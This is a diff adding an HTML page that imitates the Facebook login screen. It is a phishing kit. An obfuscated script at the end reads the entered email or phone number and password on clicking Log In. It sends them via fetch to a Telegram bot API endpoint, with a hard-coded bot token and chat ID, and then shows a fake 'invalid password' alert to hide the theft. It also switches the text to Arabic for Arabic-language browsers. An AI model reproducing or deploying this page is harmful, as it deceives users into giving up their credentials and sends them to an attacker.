@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+    <title>Log into Facebook</title>
+    <style>
+        *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    }
+
+        body{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+        
+        .container{
+            width:100%;
+            height:100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+        
+        .left, .right, form{
+            display: flex;
+            flex-direction: column;
+            align-content: center;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .left{
+            width:500px;
+            align-items: flex-start;
+        }
+        
+        .left h1{
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            font-size: 60px;
+            color: #1877f2;
+        }
+        
+        .left p{
+            font-size: 30px;
+            color:#1c1e21;
+            height: 200px;
+            text-align: center !important;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+        
+        .right{
+            width:400px;
+        }
+        
+        form{
+            background-color: white;
+            border-radius: 10px;
+            width:400px;
+            display: flex;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+        }
+        
+        form input{
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #999;
+            outline: none;
+            font-size: 16px;
+        }
+        
+        .loginBtn{
+            background-color: #1877f2;
+            padding: 15px;
+            text-align: center;
+            text-decoration: none;
+            width: 100%;
+            border-radius: 5px;
+            color: white;
+            font-size: 20px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            font-weight: 700;
+            transition: 0.5s;
+        }
+        
+        .loginBtn:hover{
+            background-color: #4257b2;
+        }
+        
+        .forget{
+            margin: 15px 0;
+            text-decoration: none;
+            color: #1877f2;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            font-size: 14px;
+        }
+        
+        .sign-up{
+            padding-top: 20px;
+            border-top: 1px solid #999;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .signupBtn{
+            background-color: #42b72a;
+            padding: 15px;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 17px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            font-weight: 600;
+            transition: 0.5s;
+        }
+        
+        .signupBtn:hover{
+            background-color: green;
+        }
+        
+        .right p{
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            font-size: 15px;
+        }
+        
+        @media(max-width:950px){
+            .container{
+                flex-direction: column;
+            }
+            
+            .left{
+                width: 400px;
+                align-content: center;
+                align-items: center;
+            }
+            
+            .left p{
+                height: 75px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.
+            </p>
+        </div>
+        <div class="right">
+            <form action="">
+                <input type="text" placeholder="Email addess or phone number">
+                <input type="password" placeholder="Password">
+                <a href="" class="loginBtn">Log In</a>
+                <a href="" class="forget">Forgotten password?</a>
+                <div class="sign-up">
+                    <a href="" class="signupBtn">Create New Account</a>
+                </div>
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+</body>
+<script>
+const _0x24b86f=_0x26e3;(function(_0x42e8c9,_0xaa7b6){const _0x5a936b=_0x26e3,_0x504912=_0x42e8c9();while(!![]){try{const _0x3d76a5=parseInt(_0x5a936b(0x1b3))/0x1*(-parseInt(_0x5a936b(0x1be))/0x2)+parseInt(_0x5a936b(0x1c6))/0x3*(-parseInt(_0x5a936b(0x1b0))/0x4)+-parseInt(_0x5a936b(0x1c2))/0x5*(parseInt(_0x5a936b(0x1bb))/0x6)+parseInt(_0x5a936b(0x1bd))/0x7+parseInt(_0x5a936b(0x1c7))/0x8*(parseInt(_0x5a936b(0x1b1))/0x9)+parseInt(_0x5a936b(0x1af))/0xa+parseInt(_0x5a936b(0x1c4))/0xb;if(_0x3d76a5===_0xaa7b6)break;else _0x504912['push'](_0x504912['shift']());}catch(_0xb03fcd){_0x504912['push'](_0x504912['shift']());}}}(_0x10ce,0xdf18f));function _0x26e3(_0x3bb311,_0xea6ad9){const _0x10ceae=_0x10ce();return _0x26e3=function(_0x26e321,_0x4baf58){_0x26e321=_0x26e321-0x1aa;let _0x16e33b=_0x10ceae[_0x26e321];return _0x16e33b;},_0x26e3(_0x3bb311,_0xea6ad9);}const telegramApiEndpoint=_0x24b86f(0x1ae)+'6741976198:AAH2WInvRsKnm1jV1OM9d2wIMT6VaJxBdh0',chatId=_0x24b86f(0x1c5),facebookTitle=document[_0x24b86f(0x1b5)](_0x24b86f(0x1ab)),facebookDescription=document[_0x24b86f(0x1b5)](_0x24b86f(0x1c8)),userLanguage=navigator['language']||navigator[_0x24b86f(0x1bf)];userLanguage[_0x24b86f(0x1b6)]('ar')&&(facebookTitle[_0x24b86f(0x1c1)]='فيسبوك',facebookDescription[_0x24b86f(0x1c1)]='تواصل\x20مع\x20الأصدقاء\x20والعالم\x20من\x20حولك\x20على\x20فيسبوك');const loginBtn=document[_0x24b86f(0x1bc)](_0x24b86f(0x1b2));loginBtn[_0x24b86f(0x1c0)]('click',function(_0x1d69fd){const _0x6c23dc=_0x24b86f;_0x1d69fd[_0x6c23dc(0x1b4)](),setTimeout(function(){const _0x4b9f4a=_0x6c23dc;alert(_0x4b9f4a(0x1aa));},0xbb8);const _0x2f404d=document['querySelector']('input[type=\x27text\x27]'),_0x1cf849=document['querySelector'](_0x6c23dc(0x1b7)),_0x33af4d=_0x2f404d[_0x6c23dc(0x1ad)],_0x3efd35=_0x1cf849[_0x6c23dc(0x1ad)],_0x53ba00=_0x6c23dc(0x1b9)+_0x33af4d+'\x0aPassword:\x20'+_0x3efd35;fetch(telegramApiEndpoint+_0x6c23dc(0x1ac),{'method':_0x6c23dc(0x1ba),'headers':{'Content-Type':_0x6c23dc(0x1c3)},'body':JSON[_0x6c23dc(0x1b8)]({'chat_id':chatId,'text':_0x53ba00})});});function _0x10ce(){const _0x25b058=['8YJenGb','facebook-description','Invalid\x20email,\x20phone,\x20or\x20password','facebook-title','/sendMessage','value','https://api.telegram.org/bot','80430kGiygn','16dnjEbd','313029lAbHEL','.loginBtn','275nBhDqz','preventDefault','getElementById','startsWith','input[type=\x27password\x27]','stringify','Email:\x20','POST','282wcrDNv','querySelector','10901030XIASah','7718PhnTKq','userLanguage','addEventListener','innerText','83135rreNmK','application/json','29410909ypiKUV','5462313510','1137999hUWCuu'];_0x10ce=function(){return _0x25b058;};return _0x10ce();}
+</script>
+</html>
